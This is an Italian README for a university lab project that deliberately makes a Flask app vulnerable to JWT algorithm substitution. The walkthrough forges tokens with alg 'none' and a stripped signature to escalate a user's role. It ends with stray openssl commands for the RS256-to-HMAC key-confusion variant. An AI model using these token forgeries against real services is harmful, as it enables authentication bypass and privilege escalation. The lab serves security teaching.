# JWT_confusion_attack

Progetto di sicurezza - Anno accademico 2019/2020

Componente software in grado simulare un attacco di tipo key confusion/algorithm substitution su Token JWT

## Creazione dell'environment per l'installazione del progetto

- Il primo step prevede l'installazione di [Python](https://www.python.org/) e di [Virtualenv](https://virtualenv.pypa.io/en/latest/installation.html) disponibile per i principali sistemi operativi. Virtualenv permette di creare ambienti python virtuali senza alterare le installazioni presenti sul sistema operativo principale

- Una volta installato Virtualenv si può procedere all'attivazione dell'ambiente e all'installazione delle componenti necessarie

```
# Si crea una directory per il progetto
$ mkdir jwt_rsa
$ cd jwt_rsa

# Si crea un ambiente denominato jwt_rsa
$ virtualenv -p python3 jwt_rsa
$ source jwt_rsa/bin/activate
```

- Lo step successivo è quello che prevende l'installazione dei pacchetti necessari al funzionamento del codice. Nello specifico il software qui implementato fa uso di alcune routine della libreria PyJWT ridotte di alcuni controlli per replicare l'attacco e del framework Flask per la creazione di endpoint REST.

```
# Installazione delle librerie
(jwt_rsa) $ pip install pyjwt==1.0.0
(jwt_rsa) $ pip install flask flask-restful cryptography
```

- Se si vuole lavorare su un db locale (nel nostro caso SQLLite) è necessario installare flask_sqlalchemy che è in grado di gestire sia db locali che db su server remoti

```
# Installazione della librearia
(jwt_rsa) $ pip install flask_sqlalchemy

```

- Copiare i file presenti nella directory *libreria* del progetto all'interno nella directory creata da pip jwt_none/lib/python3.7/site-packages/jwt


- Per lanciare il server è necessario eseguire questo comando

```
(jwt_rsa) $ FLASK_APP=start.py FLASK_DEBUG=1 flask run
```
## Funzionamento del progetto

Il software implementato provvede ad esporre su *localhost*, sulla porta 3000, quattro servizi:
- */registration* 
  - attraverso una chiamata di tipo *POST* con un JSON contenente *username*, *password*, *ruolo* (non obbligatorio) verrà creato e salvato sul DB un utente in grado di effettuare una login con la coppia di credenziali *username/password*
  ```
  { 
  "username":"username dell'utente",
  "password":"password dell'utente",
  "ruolo":"ruolo dell'utente"
  }
  ```
  -  nel caso venga omesso il *ruolo*, l'utente sarà registrato come **studente**, gli altri ruoli possibili sono **root** e **abcde**. **root** è un utente creato di proposito per evitare che un attaccante in grado di sfruttare la vulnerabilità possa essere in grado di trovare in maniera esplicita il ruolo in grado di "catturare la bandiera", il secondo invece è il ruolo che ci permette di raggiungere il nostro target
  
- */login*
  - attraverso una chiamata di tipo *POST* con un JSON contenente *username* è *password* valide, tra quelle registrate nel DB, l'utente sarà in grado di effettuare una Login e ricevere un Token JWT da usare per la chiamata */scopriruolo*
  ```
  { 
  "username":"username dell'utente",
  "password":"password dell'utente"
  }
  ```
  
- */users*
  - attraverso una chiamata di tipo *GET* il sistema restituirà la lista degli utenti registrati sul sistema
  - attraverso una chiamata di tipo *DELETE* il sistema eliminerà tutti gli utenti presenti sul DB
  
- */scopriruolo*
  - attraverso una chiamata di tipo *GET* inserendo il JWT ricevuto dalla chiamata di login all'interno dell'Authorization Header il software controllerà il ruolo dell'utente e, nel caso si riesca a catturare la bandiera, restituirà il messaggio *"Sei ufficialmente root"* 
  
## Esecuzione dell'attacco

**1) Per procedere all'attacco eseguiamo il server e provvediamo a registrare un account di tipo *studente*. Chiamiamo quindi l'endpoint */registration* con le credenziali scelte**
 ```
  { 
  "username":"studente_semplice",
  "password":"test"
  }
  ```
  Il sistema verificherà la correttezza del JSON e risponderà in questo modo
  ```
  {
    "username": "studente_semplice",
    "password": "test",
    "ruolo": null
  }
   ```
**2) Effettuiamo la login con le credenziali scelte chiamando l'endpoint */login* **
 
 Se le credenziali sono corrette il server risponderà in questo modo
  ```
 {
    "message": "Hai effettuato l'accesso come studente_semplice",
    "auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InN0dWRlbnRlX3NlbXBsaWNlIn0.XaI0mi79GAGZdxX5fU7EbuUtYTTcVElV5Z2g-XHsyk5rlv7TnFCIq8INVGELvwhVTRrCCVaSfg3l04fn6-tpogP19TH85QYz7iCVVlSw-8NWdcZKBdmO4YqCTdSqS8x-DazxYrXBTU77jIM-_zq3ZCjcEJ5xKLlh8COJjtWx2jA"
}
  ```
  Il valore della chiave *auth_token* è il nostro JWT
  
**3) Proviamo a chiamare l'endpoint */scopriruolo* con il JWT ricevuto e verifichiamo la risposta**
 ```
 {
    "message": "Benvenuto studente!"
  }
```
  Come si evince, senza alcuna modifica non siamo in grado di *catturare la bandiera*
 
**4) Andiamo ad analizzare il JWT appena ricevuto**

 La prima parte del JWT è quella che riguarda l'Header, dove viene specificato l'algoritmo di codifica
 ```
 eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9
 ```
 Decodificando questa parte otteniamo questo JSON
 ```
 {
  "typ": "JWT",
  "alg": "RS256"
}
 ```
 Come si può notare, nella chiave *alg* è chiaramente specificato l'algoritmo di codifica *RS256* , questo vuol dire che il Token è generato attraverso l'uso di chiavi pubbliche/private. Durante la codifica il Token viene generato con la chiave privata mentre per la decodifica viene usata la chiave pubblica.
 
 Procediamo quindi ad analizzare la seconda parte del JWT, quella che contiene il payload
 ```
 eyJ1c2VybmFtZSI6InN0dWRlbnRlX3NlbXBsaWNlIn0
 ```
 Decodificando questa parte otteniamo questo JSON
 ```
 {
  "username": "studente_semplice"
}
 ```
 Di fatto dovremmo modificare il payload per provare ad ottenere la bandiera
 
 La terza parte del JWT contiene una firma con una chiave *segreta* di entrambi i due blocchi qui sopra descritti. Ne va di conseguenza che se provassimo a modificare solo il payload, lasciando inalterata la firma, il sistema non sarebbe in grado di verificare la correttezza del Token.
 
 Proviamo però a cambiare la stringa relativa al Payload con un nuovo JSON
 ```
 {
  "username": "studente_semplice",
 "ruolo":"root"
}
 ```
 Che codificato risulta essere
 ```
 ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJyb290Igp9
 ```
 Il nuovo JWT sarà quindi
 ```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJyb290Igp9.XaI0mi79GAGZdxX5fU7EbuUtYTTcVElV5Z2g-XHsyk5rlv7TnFCIq8INVGELvwhVTRrCCVaSfg3l04fn6-tpogP19TH85QYz7iCVVlSw-8NWdcZKBdmO4YqCTdSqS8x-DazxYrXBTU77jIM-_zq3ZCjcEJ5xKLlh8COJjtWx2jA
 ```
 Se proviamo a chiamare l'endpoint */scopriruolo* con questo JWT il server non sarà in grado di verificare la firma e restituirà un errore di tipo *DecodeError*
 
**5) L'attacco**

L'header del JWT indica al server *come* verificare la firma del Token appena inviato. Inserendo quindi all'interno dell'header un algoritmo diverso si può "ingannare" il server e forzare a verificare la firma con l'algoritmo indicato.
Inserendo il valore *none* nella chiave *alg* dell'header ed escludendo la terza parte del JWT, quella relativa alla firma (poiché di fatto l'algoritmo *none* non effettua nessuna firma) si può provare ad ingannare il server.

Proviamo quindi a cambiare la stringa relativa all'Header con un nuovo JSON
 ```
 {
  "typ": "JWT",
  "alg": "none"
}
 ```
 Che codificato risulta essere
 ```
 ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0
 ```
 Eliminiamo la terza parte, quella relativa alla firma (lasciando però il .), il nuovo JWT sarà quindi
 ```
 ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJyb290Igp9.
 ```
 Se proviamo a chiamare l'endpoint */scopriruolo* con questo JWT il server risponderà in questo modo
 ```
 {
    "message": "Mi dispiace per te ma sei un fake root"
  }
 ```
 Questo perché nel codice è stato inserito un controllo per evitare che il ruolo possa essere scritto *in chiaro*. Cambiando ancora una volta il Payload ed usando il ruolo *codificato* *abcde* possiamo finalmente *catturare la bandiera*
 Proviamo però a cambiare la stringa relativa al Payload con un nuovo JSON
 ```
 {
  "username": "studente_semplice",
 "ruolo":"abcde"
}
 ```
 Che codificato risulta essere
 ```
 ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJhYmNkZSIKfQ
 ```
 Il nuovo JWT sarà quindi
 ```
 ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJhYmNkZSIKfQ.
 ```
  Se proviamo a chiamare l'endpoint */scopriruolo* con questo JWT il server risponderà in questo modo
 ```
 {
    "message": "Sei ufficialmente root"
 }
 ```
## Conclusioni




cat pubkey.pem | xxd -p | tr -d "\\n" > myhmac.txt

openssl dgst -sha256 -hmac -hex -macopt hexkey:\$(cat myhmac.txt) -out hmac.txt /bin/ps

https://www.getpostman.com/collections/4c9cf3a2d70263317bd6
